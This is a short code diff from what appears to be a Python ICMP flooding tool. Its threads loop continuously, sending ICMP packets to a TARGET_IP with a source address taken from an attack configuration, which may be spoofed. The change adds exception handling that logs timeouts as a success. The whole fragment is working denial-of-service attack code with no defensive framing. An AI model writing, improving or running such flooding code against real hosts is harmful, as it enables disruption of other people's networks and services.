@@ -13,9 +13,12 @@ stop = threading.Event()
 
 def connection(_: None):
     while not stop.is_set():
-        ip = IP(src=config.attack.ip, dst=TARGET_IP)
-        packet = ip/ICMP()
-        send(packet)
+        try:
+            ip = IP(src=config.attack.ip, dst=TARGET_IP)
+            packet = ip/ICMP()
+            send(packet)
+        except TimeoutError:
+            logger.info("Got a timeout :tada:!")
 
 def run():
     threads = int(config.attack.cli.pps)
